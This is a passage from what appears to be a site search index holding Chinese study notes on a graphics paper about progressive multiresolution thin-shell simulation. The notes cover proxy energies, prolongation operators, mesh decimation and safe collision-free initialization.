<li>\u5f53\u6ee1\u8db3\u68af\u5ea6\u8303\u6570\u8db3\u591f\u5c0f \\(\\nabla E(x^*)\\|\\le\\varepsilon\\) \u65f6\uff0c\u8ba4\u4e3a\u5df2\u6536\u655b\u5230\u5e73\u8861\u6001</li> </ul> <p>\u4e3a\u4e86\u907f\u514d\u76f4\u63a5\u5728\u9ad8\u5206\u8fa8\u7387\u7f51\u683c\u4e0a\u8fdb\u884c\u6602\u8d35\u7684\u6c42\u89e3\uff0c\u8bba\u6587\u63d0\u51fa\u4e00\u79cd\u5355\u5411\u975e\u7ebf\u6027\u591a\u5206\u8fa8\u7387\u6c42\u89e3\uff08one-way nonlinear multiresolution\uff09\uff0c\u5305\u542b\u4e24\u5927\u5b50\u6d41\u7a0b\uff1a</p> <ul> <li>&lt;1&gt; Preview: \\(x_l^t \\rightarrow x_l^{t+1}\\)\uff0c\u5728\u7b2c \\(l\\) \u5c42\u8ba1\u7b97\u7ed3\u679c\uff0c\u5206\u8fa8\u7387\u8d8a\u7c97\uff0c\u8ba1\u7b97\u8d8a\u5feb\uff0c\u4f46\u7cbe\u5ea6\u8d8a\u4f4e</li> <li>&lt;2&gt; Refinement: \\(x_l^{t+1} \\rightarrow x_{l+1}^{t+1}\\)\uff0c\u5c06 \\(l\\) \u5c42\u7ed3\u679c\u5ef6\u62d3\u5230\u7b2c \\(l+1\\) \u5c42</li> </ul>"},{"location":"Accumulation/paper/speedup_2/#coarse-level-proxy-energies","title":"Coarse-Level Proxy Energies","text":"<p>\u5728\u591a\u5206\u8fa8\u7387\u4eff\u771f\u4e2d\uff0c\u76f4\u63a5\u5728\u7c97\u7f51\u683c\u4e0a\u4f7f\u7528\u6700\u7ec6\u7f51\u683c\u7684\u5b8c\u6574\u52bf\u80fd\uff08\u5305\u62ec\u58f3\u5f39\u6027 \u03a8\u3001\u63a5\u89e6\u5c4f\u969c B\u3001\u6469\u64e6 D\u3001\u5e94\u53d8\u9650 S\uff09\u5f80\u5f80\u4e0d\u591f\u5408\u7406\u2014\u2014</p> <ul> <li>\u58f3\u5f39\u6027 \u03a8 \u4f9d\u8d56\u7ec6\u7f51\u683c\u7684\u66f2\u7387\u548c\u62c9\u4f38\u6a21\u5f0f\uff0c\u5728\u7c97\u7f51\u683c\u4e0a\u65e0\u6cd5\u51c6\u786e\u8bc4\u4f30\uff1b</li> <li>\u63a5\u89e6\uff0f\u5e94\u53d8\u9650\u5236 \u76f8\u5173\u7684\u5c4f\u969c\u9879 B\u3001D\u3001S \u5219\u5b8c\u5168\u4e22\u5931\u4e86\u6700\u7ec6\u683c\u53ef\u80fd\u51fa\u73b0\u7684\u5c40\u90e8\u63a5\u89e6\u4e0e\u8fc7\u4f38\u5c55\u98ce\u9669\u3002</li> </ul> <p>\u56e0\u6b64\uff0c\u8bba\u6587\u5728\u6bcf\u4e2a\u7c97\u5c42 \\(l\\lt L\\) \u5b9a\u4e49\u4e86\u4e00\u4e2a\u201c\u4ee3\u7406\u201d\uff08proxy\uff09\u52bf\u80fd \\(F_l(x_l)\\)\uff0c\u7528\u5b83\u5728\u7c97\u5c42\u4e0a\u540c\u65f6\u8fd1\u4f3c\u53c8\u4fdd\u8bc1\u53ef\u884c\u6027\u5730\u6a21\u62df\u7ec6\u5c42\u884c\u4e3a\u3002\u516c\u5f0f(2)\u7ed9\u51fa\u4e86\u7b2c \\(l\\) \u5c42\u7684\u4ee3\u7406\u52bf\u80fd\uff1a</p> \\[\\tag{2} F_l(x_l) = \\underbrace{B_l(x_l) + D_l(x_l) + S_l(x_l)}_{C_l(x_l)\\;(=\\text{Coarse barrier terms})} \\;+\\; \\underbrace{\\Psi_l\\bigl(P^l(x_l)\\bigr)}_{\\text{Shell elastic at fine level}} \\] <ul> <li>\\(C_l(x_l)\\)\uff08\u7c97\u5c42\u5c4f\u969c\u9879\uff09\uff1a<ul> <li>\\(B_l\\)\uff1a\u63a5\u89e6\u5c4f\u969c\uff0c\u9632\u6b62\u7c97\u5c42\u8282\u70b9\u51fa\u73b0\u81ea\u7a7f\u900f\u6216\u4e0e\u5176\u4ed6\u7269\u4f53\u76f8\u4ea4\uff1b</li> <li>\\(D_l\\)\u200b\uff1a\u6469\u64e6\u8017\u6563\uff0c\u7c97\u5c42\u63a5\u89e6\u9762\u4e0a\u7684\u6469\u64e6\u80fd\u91cf\uff1b</li> <li>\\(S_l\\)\u200b\uff1a\u5e94\u53d8\u9650\u5236\uff0c\u5728\u7c97\u5c42\u4e0a\u6291\u5236\u8fc7\u5ea6\u62c9\u4f38\uff08\u7528\u7c97\u7f51\u683c\u4e0a\u7684\u5355\u5143\u5e94\u53d8\u8ba1\u7b97\uff09\u3002</li> <li>\u8fd9\u4e09\u8005\u5408\u8d77\u6765\u4fdd\u8bc1\u4e86\u89e3\u5728\u5f53\u524d\u7f51\u683c\u62d3\u6251\u4e0b\u7684\u53ef\u884c\u6027\uff08feasibility\uff09\uff0c\u5373\u6ca1\u6709\u7a7f\u900f\u3001\u6ca1\u6709\u8fc7\u4f38\u5c55\u3002</li> </ul> </li> <li>\\(\\Psi_l(P^l(x_l))\\)\uff08\u5ef6\u62d3\u540e\u5728\u6700\u7ec6\u5c42\u8bc4\u4f30\u7684\u58f3\u5f39\u6027\u80fd\u91cf\uff09\uff1a<ul> <li>\u5728\u6700\u7ec6\u5c42\u4e0a\u8ba1\u7b97\u58f3\u5f39\u6027 \u03a8\uff0c\u80fd\u591f\u51c6\u786e\u6355\u6349\u5f2f\u66f2\u3001\u626d\u66f2\u7b49\u673a\u5236\u3002</li> </ul> </li> </ul> <p>\u8fd9\u6837\uff0c\u4ee3\u7406\u52bf\u80fd\u65e2\u4fdd\u7559\u4e86\u9876\u5c42\uff08\u6700\u7ec6\u5c42\uff09\u58f3\u5f39\u6027\u5bf9\u5f62\u72b6\u8d28\u91cf\u7684\u4e25\u683c\u7ea6\u675f\uff0c\u53c8\u53ea\u7528\u7c97\u7f51\u683c\u4e0a\u7684\u8ba1\u7b97\u6765\u7ef4\u6301\u6574\u4f53\u53ef\u884c\u6027\u3002</p> <p>\u6700\u5927\u7684\u521b\u65b0\u70b9\u5728\u4e8e\u4f7f\u7528\u6700\u7ec6\u5c42\u7684\u5f39\u6027\u52bf\u80fd\u4f5c\u4e3a\u7c97\u5c42\u7684\u80fd\u91cf\u9879</p> <p>\u6bcf\u4e2a\u65f6\u95f4\u6b65\u7684\u51c6\u9759\u6001\u89e3\u9700\u518d\u52a0\u4e0a\u9690\u5f0f\u65f6\u95f4\u79ef\u5206\u7684\u60ef\u6027\u9879\uff0c\u56e0\u6b64\u6bcf\u5c42\u7684 Preview \u6b65\u9aa4\u53ef\u4ee5\u8868\u793a\u4e3a\u5982\u4e0b\u4f18\u5316\u65b9\u7a0b\uff1a</p> \\[ x^{t+1}_l =\\arg\\min_{ x_l}\\; {\\frac{1}{2h^2}\\,\\|x_l - x^t_l \\|_{M _l}^2} \\;+\\; F_l (x_l) \\tag{3} \\]"},{"location":"Accumulation/paper/speedup_2/#refinement-and-safe-initialization","title":"Refinement and Safe Initialization","text":"<p>\u5728\u5f97\u5230 \\(l\\) \u5c42\u7684 Preview \u540e\uff0c\u6211\u4eec\u6839\u636e\u5ef6\u62d3\u7b97\u5b50\u8ba1\u7b97\u5f97\u5230\u4e0b\u4e00\u5c42\u7684 Safe Initializer\uff1a</p> \\[ x_{l+1}^t = P_{l+1}^t (x_l^*) \\] <p>\u4e0b\u4e00\u5c42\u7684 Initializer \u8981\u5c3d\u53ef\u80fd\u9760\u8fd1 \\(x_{l+1}^t\\)</p> <p>\u5bf9\u4e8e\u7cbe\u7ec6\u5316\u7684\u8fc7\u7a0b\uff0c\u53ef\u80fd\u5b58\u5728\u7cbe\u7ec6\u5316\u540e\u7684 mesh \u8fdd\u53cd\u4e86 contact constraints \u6216 strain limits \u7b49\u9650\u5236\u3002\u56e0\u6b64\u6211\u4eec\u5728 \\(l+1\\) \u5c42\u4e5f\u8981\u7ee7\u7eed\u8fdb\u884c\u5982 \\((3)\\) \u7684 Progressive Simulation\u3002</p>"},{"location":"Accumulation/paper/speedup_2/#progressive-simulation-for-shells","title":"Progressive Simulation For Shells","text":"<p>\u8bba\u6587\u7684\u76ee\u6807\u662f\u5b9e\u73b0\u4e00\u4e2a\u6e10\u8fdb\u5f0f\uff08progressive\uff09\u6a21\u62df\u6846\u67b6\uff0c\u9002\u7528\u4e8e \u7ed3\u6784\u5316 \u548c \u975e\u7ed3\u6784\u5316\u7684\u4e09\u89d2\u7f51\u683c\u3002\u8fd9\u4e2a\u76ee\u6807\u8981\u6c42\u4ed6\u4eec\u8bbe\u8ba1\u51fa\uff1a</p> <ul> <li>\u4e00\u4e2a\u5408\u9002\u7684\u7ec6\u5316\uff08prolongation\uff09\u64cd\u4f5c\u7b26\uff1b</li> <li>\u4e00\u79cd\u5b89\u5168\u7684\u521d\u59cb\u5316\u65b9\u5f0f\uff0c\u6ee1\u8db3\u4e24\u4e2a\u6761\u4ef6\uff1a<ul> <li>\u5185\u5728\u5f62\u53d8\uff08in-plane\uff0c\u4e3b\u8981\u662f\u62c9\u4f38\uff09\u548c\u5916\u5728\u5f62\u53d8\uff08extrinsic\uff0c\u4e3b\u8981\u662f\u5f2f\u66f2\uff09\u90fd\u80fd\u88ab\u6a21\u62df\u51fa\u6765\uff0c\u4e14\u7b26\u5408\u7269\u7406\u58f3\u4f53\u6a21\u578b\uff1b</li> <li>\u6a21\u578b\u5728\u5c42\u7ea7\u4e2d\u7684\u6bcf\u4e00\u5c42\u90fd\u4fdd\u7559\u672a\u53d8\u5f62\u7684\u53c2\u8003\u5f62\u72b6\uff08rest shape\uff09\uff0c\u9632\u6b62\u56e0\u4e0b\u91c7\u6837\u6216\u63d2\u503c\u5bfc\u81f4\u201c\u5e7d\u7075\u529b\u201d\u6216\u4e0d\u771f\u5b9e\u7684\u5f62\u53d8\u53cd\u5e94\u3002</li> </ul> </li> </ul> <p>Progressive Shell Quasistatics(PSQ)</p> <p>\u5b83\u5728 PCS \u57fa\u7840\u4e0a\uff0c\u5c06\u6e10\u8fdb\u5f0f\u6a21\u62df\u5f15\u5165\u5230\u4e86\u4efb\u610f\u8584\u58f3\uff0f\u677f\u51e0\u4f55\u7684\u4eff\u771f\u4e2d\uff0c\u652f\u6301\u975e\u7ed3\u6784\u5316\u4e09\u89d2\u7f51\u683c\uff08\u5305\u62ec\u66f2\u9762\u548c\u590d\u6742\u8fb9\u754c\uff09\uff0c\u6838\u5fc3\u8d21\u732e\uff1a</p> <ul> <li>\u901a\u7528\u7f51\u683c\u5c42\u6b21\u7ed3\u6784\uff1a\u9488\u5bf9\u4efb\u610f\u4e09\u89d2\u7f51\u683c\uff0cPSQ\u8bbe\u8ba1\u4e86\u4e00\u4e2a\u65b0\u7684\u201c\u4ece\u7c97\u5230\u7ec6\u201d\u5c42\u7ea7\u6784\u5efa\u65b9\u6cd5\u3002\u8bba\u6587\u63d0\u51fa\u4e86\u4e00\u79cd\u975e\u7ebf\u6027\u5ef6\u62d3\uff08prolongation\uff09\u7b97\u5b50\uff0c\u7528\u4e8e\u5c06\u7c97\u7f51\u683c\u7684\u5f62\u53d8\u6620\u5c04\u5230\u7ec6\u7f51\u683c\u4e0a\uff0c\u540c\u65f6\u4fdd\u6301\u58f3\u4f53\u539f\u59cb\u7684\u9759\u6001\u5f62\u72b6\u4e0d\u53d8\uff08rest-shape preserving\uff09\u3002\u8fd9\u4e2a\u5ef6\u62d3\u7b97\u5b50\u8003\u8651\u4e86\u8868\u9762\u66f2\u7387\u548c\u66f2\u9762\u5185\u5728\u51e0\u4f55\uff0c\u80fd\u591f\u5728\u7f51\u683c\u7ec6\u5316\u65f6\u91cd\u6784\u7ec6\u8282\u66f2\u9762\u3002</li> <li>\u5b89\u5168\u7684\u4e0a\u91c7\u6837\u65b9\u6cd5\uff1aPSQ\u8fd8\u63d0\u51fa\u4e86\u4e00\u79cd\u5f62\u72b6\u4fdd\u6301\u7684\u5b89\u5168\u4e0a\u91c7\u6837\u673a\u5236\uff0c\u4ee5\u907f\u514d\u7ec6\u5316\u8fc7\u7a0b\u4e2d\u4ea7\u751f\u51e0\u4f55\u81ea\u7a7f\u63d2\u6216\u8fc7\u5ea6\u62c9\u4f38\u3002\u5177\u4f53\u800c\u8a00\uff0c\u5728\u5c06\u7c97\u7f51\u683c\u5f62\u53d8\u63d2\u503c\u5230\u7ec6\u7f51\u683c\u540e\uff0cPSQ\u5bf9\u65b0\u751f\u6210\u7684\u9876\u70b9\u4f4d\u7f6e\u8fdb\u884c\u6821\u6b63\uff0c\u4f7f\u5176\u4e25\u683c\u4f4d\u4e8e\u5bf9\u5e94\u66f2\u9762\u4e0a\uff0c\u5e76\u5bf9\u53ef\u80fd\u7684\u91cd\u53e0\u8fdb\u884c\u68c0\u6d4b\u548c\u4fee\u6b63\uff0c\u540c\u65f6\u7ea6\u675f\u5c40\u90e8\u5e94\u53d8\u4e0d\u8d85\u8fc7\u9608\u503c\uff08strain limiting\uff09\u3002\u8fd9\u6837\u5728\u6bcf\u4e00\u5c42\u7ea7\u90fd\u4fdd\u8bc1\u78b0\u649e\u51e0\u4f55\u65e0\u4ea4\u4e92\u4e14\u5f62\u53d8\u5408\u7406\u3002</li> </ul>"},{"location":"Accumulation/paper/speedup_2/#decimation","title":"Decimation","text":"<p>\u6211\u4eec\u5c06\u521d\u59cb Mesh \u8bbe\u7f6e\u4e3a \\(M_L\\)\uff0c\u5373 finest level\uff0c\u5e76\u901a\u8fc7\u4e00\u7cfb\u5217 Edge-Collapse Decimation \u5efa\u7acb \\(M_{L-1},...,M_0\\)\uff0c\u4ece\u800c\u5f97\u5230\u5404\u4e2a\u5c42\u521d\u59cb\u7684 rest positions \\(\\bar{x}_l\\)\u3002</p> <p>Edge-Collapse Decimation</p> <ul> <li>Quadric Error Metrics (QEM) [Garland and Heckbert 1997]\uff1b</li> <li>Probabilistic Quadrics [Trettner and Kobbelt 2020]\uff0c\u4f7f\u5f97\u7b80\u5316\u6548\u679c\u66f4\u81ea\u7136\u3001\u66f4\u9ad8\u8d28\u91cf\u3002</li> </ul> <p>\u7136\u800c\uff0c\u73b0\u5b58\u7684\u51e0\u79cd\u7ec6\u5316\u65b9\u6cd5\uff08\u5305\u62ec Intrinsic Prolongation \u548c Affine Prolongation\uff09\u90fd\u96be\u4ee5\u5728\u58f3\u4f53\u6a21\u62df\u4e2d\u5e94\u7528\uff0c\u5e76\u4e14\u5b83\u4eec\u63d0\u4f9b\u7684 Linear Operator \u7f3a\u4e4f\u7a00\u758f\u6027\uff0c\u5bfc\u81f4\u96be\u4ee5\u5728 High Resolution Mesh Simulation \u4e2d\u5e94\u7528\u3002</p> <p>\u5bf9\u4e8e\u6211\u4eec\u5e0c\u671b\u7684 Prolongation Operator\uff0c\u6211\u4eec\u5e0c\u671b\u5177\u6709\u5982\u4e0b\u4e09\u4e2a\u5c5e\u6027\uff1a</p> <ul> <li>&lt;1&gt; Rest Shape Recovery: Prolongation \u9700\u8981\u5728\u6240\u6709\u5c42\u7ea7\u4e0a\u4fdd\u6301 Rest Shape</li> <li>&lt;2&gt; Shell-model Consistency: Prolongation \u9700\u8981\u540c\u65f6\u653e\u5927\u5185\u5728\uff08\u62c9\u4f38\uff09\u548c\u5916\u5728\uff08\u5f2f\u66f2\uff09\u53d8\u5f62\u6a21\u5f0f\u7684\u91c7\u6837</li> <li>&lt;3&gt; Efficiency: \u6e10\u8fdb\u5f0f\u6a21\u62df\u5728\u6bcf\u6b21 force and refinement evaluation \u90fd\u9700\u8981\u8c03\u7528 Prolongation\uff0c\u56e0\u6b64\u8fd9\u4e2a\u64cd\u4f5c\u5fc5\u987b\u8981\u5728\u8fd9\u4e24\u79cd\u64cd\u4f5c\u4e2d\u90fd\u4fdd\u6301 Inexpensive</li> </ul>"},{"location":"Accumulation/paper/speedup_2/#special-case","title":"Special Case","text":"<p>\u4e3a\u4e86\u4fbf\u4e8e\u7406\u89e3\uff0c\u6211\u4eec\u5148\u53ea\u8003\u8651\u6700\u7b80\u5355\u7684\u5c42\u7ea7\u6784\u5efa\u65b9\u6cd5\uff1aSingle-Edge Collapse \u5f00\u59cb\u3002\u90a3\u4e48 Rest-Shape Prolongation \u53ef\u4ee5\u7b80\u5355\u4f7f\u7528 Edge Expansion \u8fdb\u884c\u6062\u590d\u3002</p> Single-Edge Collapse &amp; Intrinsic Coordinate <p></p> <p>\u6211\u4eec\u4f7f\u7528 Intrinsic Prolongation \u4e2d\u7684 Self-Parameterization \u65b9\u6cd5\u53bb\u5b9a\u4e49\u5185\u5728\u5750\u6807\uff08Intrinsic Coordinates\uff09\uff0c\u4ece\u800c\u951a\u5b9a \\(l+1\\) \u5c42\u4e24\u4e2a\u5206\u88c2\u7684\u65b0\u8282\u70b9\u7684\u4f4d\u7f6e \\(\\bar v_{l+1}^i, \\bar v_{l+1}^j\\)\u3002</p> <p>Intrinsic uv\uff0c\u672c\u8d28\u5373\u63d2\u503c\u91cd\u5fc3\u5750\u6807</p> \\[\\bar v_{l+1}^i = \\mathbf u_i \\bar x_0 + \\mathbf v_i \\bar x_1 + (1- \\mathbf u_i - \\mathbf v_i)\\bar x_2\\] <p>\u63a5\u4e0b\u6765\u6211\u4eec\u8fd8\u8981\u8bb0\u5f55 \\(l\\) \u5c42\u548c \\(l+1\\) \u5c42\u4e4b\u95f4\u7684 Extrinsic Difference \\(\\bar d^i = \\bar x_{l+1}^i - \\bar v_{l+1}^i\\)\uff0c\u5176\u4e2d \\(\\bar v_{l+1}^i\\) \u662f\u4ece \\(l\\) \u5c42\u7cbe\u7ec6\u5316\u6620\u5c04\u540e\u7684\u4f4d\u7f6e\uff0c\\(\\bar x_{l+1}^i\\) \u662f\u5bf9\u5e94\u70b9\u5728 \\(l+1\\) \u5c42\u7684 rest shape \u4e2d\u7684\u4f4d\u7f6e\u3002</p> <p>Extrinsic Difference \u53ea\u8bb0\u5f55\u4e00\u6b21\uff0c\u8bb0\u5f55\u5176\u5728 3D \u7a7a\u95f4\u4e2d\u504f\u79fb\u4e86\u591a\u5c11</p> <p>\u5bf9\u4e8e\u5305\u542b vertex \\(i\\) \u7684\u4e09\u89d2\u5f62\uff0c\u5b83\u7684\u4e09\u4e2a\u9876\u70b9\u7684\u9759\u6b62\u4f4d\u7f6e\u8868\u793a\u4e3a \\(\\bar x_0, \\bar x_1, \\bar x_2\\)\uff0c\u6211\u4eec\u5c06 Extrinsic Difference \u5206\u89e3\u4e3a\u6cd5\u5411\u8d21\u732e\uff08out-of-plane\uff09\u548c\u5207\u5e73\u9762\u5185\u8d21\u732e\uff08in-plane\uff09\uff1a</p> <ul> <li>out-of-plane: \\(\\gamma^i = \\bar{n}^T \\bar{d}^i\\in \\mathbb{R}\\)</li> <li>in-plane\uff1a\\(t^i = \\left [ \\bar e^T \\bar d^i, (\\bar n \\times \\bar e )^T\\bar d^i  \\right ]^T \\in \\mathbb{R}^2\\)<ul> <li>\u662f\u4e00\u4e2a\u4e8c\u7ef4\u201c\u5411\u91cf\u201d \\((a,b)\\)</li> </ul> </li> </ul> <p>\u5176\u4e2d \\(\\bar n\\) \u4e3a\u4e09\u89d2\u5f62\u7684\u5355\u4f4d\u6cd5\u5411\u91cf\uff0c\\(\\bar n^T \\bar d^i\\) \u8868\u793a\u504f\u79fb\u5411\u91cf \\(\\bar d^i\\) \u5728\u6cd5\u5411\u91cf\u4e0a\u7684\u6295\u5f71\uff0c\u8fd9\u79cd\u8868\u793a\u65b9\u5f0f\u5728\u77e9\u9635\u4e58\u6cd5\u4e2d\u7b49\u4ef7\u4e8e\u5411\u91cf\u70b9\u4e58\u3002</p> <p>\u90a3\u4e48 \\(\\bar d^i\\) \u53ef\u4ee5\u8868\u793a\u4e3a\u4e24\u4e2a\u8d21\u732e\u7684\u7ebf\u6027\u7ec4\u5408\uff1a</p> \\[\\begin{array}l &amp; \\bar d^i = \\bar n \\gamma^i + \\left ( \\bar e , \\bar n \\times \\bar e \\right) t^i \\\\ with &amp;  \\bar e = (\\bar x_1 -\\bar x_0) / ||\\bar x_1 -\\bar x_0 || \\end{array} \\] <p>\\(\\{\\bar n, \\bar e, \\bar n \\times \\bar e\\}\\) \u6784\u6210\u4e86\u4e00\u7ec4\u6b63\u4ea4\u57fa\uff0c\u8986\u76d6\u4e86\u6574\u4e2a 3D \u7a7a\u95f4\uff0c\u56e0\u6b64\u53ef\u4ee5\u7528\u6765\u8868\u793a \\(\\bar d\\)</p> <p>\u5728\u6a21\u62df\u8fc7\u7a0b\u4e2d\uff0cShell Deformation \u5bfc\u81f4\u5982\u4e0a\u4e24\u4e2a\u7ec4\u6210\u90e8\u5206\u76f8\u5e94\u6539\u53d8\uff1a</p> \\[ \\begin{array}l x_{l+1}^i = v_{l+1}^i + a^i(x _l) \\\\ a^i(x_l) = n^i(x_l) \\gamma^i + R^i(x_l) t^i  \\end{array} \\] <p>\u5176\u4e2d \\((\\gamma^i, t^i)\\in \\mathbb{R}^3\\) \u53ea\u7528\u8ba1\u7b97\u4e00\u6b21\u3002</p>"},{"location":"Accumulation/paper/speedup_2/#general-case","title":"General Case","text":"<p>\u5728\u4e00\u822c\u4f8b\u5b50\u4e2d\uff0cEdge-Collapse \u53ef\u80fd\u4f1a\u8fdb\u884c\u591a\u6b21\uff08\u901a\u5e38\u5d4c\u5957\u8fdb\u884c\uff09\uff0c\u4f46\u662f\u6211\u4eec\u4ecd\u7136\u80fd\u591f\u4f7f\u7528 Linear Operation \u6765\u8ba1\u7b97 anchor location\uff1a\\(v_{l+1} = U_{l+1}^l x_l\\)\u3002</p> <p>\u5bf9\u4e8e \\(m_l\\) expanded nodes\uff0c\u6211\u4eec\u5c06\u6240\u6709\u975e\u7ebf\u6027\u504f\u79fb\u8ba1\u7b97\u8868\u793a\u4e3a\uff1a</p> \\[ a_{l+1}^l (x_l) = \\left [ a^1 (x_l)^T, a^2 (x_l)^T,...,a^{m_l} (x_l)^T\\right ]^T \\tag{6} \\] <p>\u90a3\u4e48\u6bcf\u5c42\u7684 shell-prolongation operator \u4e3a\uff1a</p> \\[ x_{l+1} = P_{l+1}^l (x_l) = U_{l+1}^l x_l + a_{l+1}^l (x_l) \\tag 7 \\]"},{"location":"Accumulation/paper/speedup_2/#direct-prolongation","title":"Direct Prolongation","text":"<p>\u4e0a\u8282\u8bb2\u7684\u90fd\u662f\u4e24\u4e2a\u76f8\u90bb\u5c42\u7ea7\u4e4b\u95f4\u7684 Prolongation \\(P_{l+1}^l(.)\\)\uff0c\u5b9e\u9645\u4e0a mapping \u4e5f\u5141\u8bb8\u6211\u4eec\u5efa\u7acb\u4e0d\u76f8\u90bb\u5c42\u7ea7\u4e4b\u95f4\u7684 Direct Prolongation\uff0c\u5b9a\u4e49 \\(P^l(.)\\) \u8868\u793a\u4ece\u5c42\u7ea7 \\(l&lt;L\\) \u76f4\u63a5\u5ef6\u62d3\u5230 finest mesh \u7684\u7b97\u5b50\u3002</p> <p>\u548c\u4e4b\u524d\u7c7b\u4f3c\uff0c\u6211\u4eec\u9884\u5148\u8ba1\u7b97 level \\(l\\) \u548c level \\(L\\) \u4e4b\u95f4\u7684 extrinsic differences \u548c pre-vertex displacements \\((\\gamma^i, t^i)\\)\u3002\u901a\u8fc7 repeated composition\uff0c\u5f97\u5230\u76f8\u5e94\u7684\u7ebf\u6027\u7b97\u5b50 \\(U^l = U_L^{L-1} ...U_{l+1}^l\\)\u3002\u63a5\u4e0b\u6765\u7684\u516c\u5f0f\u5219\u7c7b\u4f3c (6) \u548c (7)\uff1a</p> \\[ a^l (x_l) = \\left [ a^1 (x_l)^T, a^2 (x_l)^T,...,a^{m} (x_l)^T\\right ]^T \\tag{8} \\] <p>Direct Prolongation Operators \u4e3a\uff1a</p> \\[ x = P^l (x_l) = U^l x_l + a^l (x_l) \\tag 9 \\] <p>\u9700\u8981\u6ce8\u610f\uff0c\u8fd9\u79cd Direct Prolongation \u5e76\u4e0d\u7b49\u6548\u4e8e\u9010\u5c42\u5e94\u7528\u5ef6\u62d3\uff0c\u867d\u7136\u5b83\u4eec\u90fd\u80fd\u6b63\u786e\u8fd8\u539f\u51fa\u76f8\u540c\u7684 rest-shape\uff0c\u4f46\u662f\u5728 simulation \u4e2d\u65bd\u52a0\u7684\u5f62\u53d8\u8def\u5f84\u4e0d\u540c\u3002</p>"},{"location":"Accumulation/paper/speedup_2/#safe-initialization","title":"Safe Initialization","text":"<p>Safe Initialization</p> <p></p> <p>\u5728\u9010\u5c42\u7ec6\u5316\u7684\u4eff\u771f\u8fc7\u7a0b\uff0c\u6211\u4eec\u9700\u8981\u63d0\u4f9b\u4e00\u4e2a\u5b89\u5168\uff08\u5373\u6ca1\u6709\u7a7f\u900f\u6216\u8fdd\u53cd\u5e94\u53d8\u9650\u5236\uff09\u7684\u521d\u59cb\u5316\u72b6\u6001\u3002</p> <p>\u603b\u4f53\u601d\u8def\u662f\u5148\u6784\u9020 \\(l+1\\) \u5c42\u7684\u4e00\u4e2a\u975e\u9000\u5316\u3001\u5b89\u5168\u7684\u3001\u65e0\u81ea\u76f8\u4ea4\u7684 initial expansion\uff0c\u7136\u540e\u5411 Prolongation \u7684\u76ee\u6807\u4f4d\u7f6e\u505a CCD \u641c\u7d22\u3002</p>"},{"location":"Accumulation/paper/speedup_2/#safe-initial-expansion","title":"Safe Initial Expansion","text":"<p>\u5728 Initial Expansion \u7684\u8fc7\u7a0b\u4e2d\uff0c\u6211\u4eec\u5bf9\u521d\u59cb\u8981\u5206\u5f00\u4e3a vertex \\(i,j\\) \u7684\u8282\u70b9 \\(k\\) \u505a\u4e00\u4e2a\u521d\u59cb\u6270\u52a8\uff0c\u4f7f\u5176\u8fb9\u957f\u975e\u96f6\uff08\\(\\gt dhat\\)\uff09\uff0c\u4ece\u800c\u786e\u4fdd\u4e0d\u4f1a\u5f71\u54cd\u5230 CCD \u7684\u78b0\u649e\u68c0\u6d4b\u3002\u9057\u61be\u7684\u662f\uff0c\u5728 3D \u7a7a\u95f4\u4e2d\uff0c\u5373\u4fbf\u662f\u4e00\u4e2a\u5fae\u5c0f\u7684\u6270\u52a8\u4e5f\u6709\u53ef\u80fd\u9020\u6210\u4e25\u91cd\u7684 self-intersection \u6216\u8005 global intersection\u3002</p> <p>\u4e3a\u4e86\u83b7\u5f97\u4e00\u4e2a initial safe perturbation per expansion\uff0c\u4f5c\u8005\u91c7\u7528\u968f\u673a\u5206\u5c42\u91c7\u6837\u6cd5\uff08randomized stratified sampling\uff09\uff1a</p> <p>\u7b2c\u4e00\u6b65\uff1afirst-attempt \u8bd5\u63a2\u6270\u52a8</p> <ul> <li>\u5c1d\u8bd5\u5148\u6309\u76ee\u6807\u65b9\u5411\u6270\u52a8 i \u548c j\uff0c\u4f46\u53ea\u5728 patch \u5c40\u90e8\u5185\u68c0\u67e5\u662f\u5426\u4ea4\u53c9\u3002</li> <li>\u6270\u52a8\u5e45\u5ea6\u7531\u67d0\u4e2a\u5b89\u5168\u4e0a\u754c\u63a7\u5236\uff0c\u786e\u4fdd\u4e0d\u4f1a\u548c\u522b\u7684 patch \u4ea4\u53c9\uff08global intersection-free\uff09\u3002</li> </ul> <p>\u5982\u679c\u6210\u529f\uff1a</p> <ul> <li>\u5373\u5c40\u90e8\u4e5f\u65e0\u4ea4\u53c9\uff0c\u5219\u7528\u6b64\u4f5c\u4e3a safe initial\uff0c\u8fdb\u5165 CCD \u641c\u7d22\u9636\u6bb5\u3002</li> </ul> <p>\u5982\u679c\u5931\u8d25\uff08\u5b58\u5728\u5c40\u90e8\u81ea\u4ea4\uff09\uff1a</p> <ul> <li>\u5f00\u542f\u968f\u673a\u91c7\u6837\u9636\u6bb5\uff1a\u5bf9 j \u968f\u673a\u9009\u53d6\u6270\u52a8\u65b9\u5411\uff08\u4ecd\u7136\u7528\u5c0f\u5e45\u5ea6\uff09\uff0c\u4e00\u4e00\u5c1d\u8bd5\u3002</li> <li>\u6bcf\u6b21\u91c7\u6837\u540e\u68c0\u67e5\u662f\u5426\u4ea7\u751f\u5c40\u90e8\u4ea4\u53c9\u3002</li> <li>\u5982\u679c\u6ca1\u6709\u4ea4\u53c9\uff0c\u5c31\u505c\u6b62\uff0c\u91c7\u6837\u6210\u529f\u3002</li> </ul> <p>\u4e3a\u4ec0\u4e48\u5bf9 j \u968f\u673a\u9009\u53d6\u6270\u52a8\u65b9\u5411\u5c1d\u8bd5\uff1f\u8fd8\u6ca1\u641e\u61c2</p> <p>\u95ee\u4e86 GPT\uff0c\u4e00\u822c\u5bf9 j \u65bd\u52a0\u968f\u673a\u6270\u52a8\u540e\uff0ci \u4e5f\u8981\u76f8\u5e94\u8c03\u6574\u3002\u5e38\u89c1\u505a\u6cd5\u662f\u8ba9 i \u843d\u5728\u5bf9\u79f0\u4f4d\u7f6e\uff0c\u6216\u8005\u4ec5\u4fdd\u6301\u53d8\u957f\u7ea6\u675f\uff0c\u4fdd\u8bc1 \\(||x_i - x_j||\\) \u5728\u5408\u7406\u8303\u56f4\u5185\uff0c\u9632\u6b62\u5f62\u72b6\u7578\u5f62\u3002</p>"},{"location":"Accumulation/paper/speedup_2/#ccd-filtered-geometric-expansion","title":"CCD-filtered Geometric Expansion","text":"<p>\u5728\u5b8c\u6210\u5982\u4e0a safe initial expansion \u64cd\u4f5c\uff0c\u786e\u4fdd\u8fb9\u957f\u975e\u96f6\u7684\u57fa\u7840\u4e0a\uff0c\u6211\u4eec\u63a5\u4e0b\u6765\u8be6\u7ec6\u8bb2\u8ff0\u5982\u4f55\u901a\u8fc7 CCD safe-stepping \u5b89\u5168\u5730\u6269\u5f20\u8fd9\u4e9b edges \u5230\u5b83\u4eec\u7684 